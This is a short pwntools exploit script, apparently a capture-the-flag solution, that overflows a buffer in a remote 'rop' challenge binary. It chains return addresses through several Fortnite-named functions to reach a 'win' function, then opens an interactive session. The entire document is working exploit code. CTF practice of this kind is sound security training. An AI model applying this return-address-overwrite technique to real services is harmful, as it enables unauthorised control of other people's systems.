from pwn import *
import struct

#p = process("./rop")
p = remote("ctf.umbccd.io", 4100)
e = ELF("./rop")

print p.recvuntil("boys?")
context.log_level = "debug"

sc = cyclic(16)
sc += flat(e.symbols['tilted_towers'], e.symbols['tryme'])
sc += cyclic(16)
sc += flat(e.symbols['junk_junction'], e.symbols['tryme'])
sc += cyclic(16)
sc += flat(e.symbols['snobby_shores'], e.symbols['tryme'])
sc += cyclic(16)
sc += flat(e.symbols['greasy_grove'], e.symbols['tryme'])
sc += cyclic(16)
sc += flat(e.symbols['lonely_lodge'], e.symbols['tryme'])
sc += cyclic(16)
sc += flat(e.symbols['dusty_depot'], e.symbols['tryme'])
sc += cyclic(16)
sc += flat(e.symbols['loot_lake'], e.symbols['win'])
p.send(sc)

p.interactive()
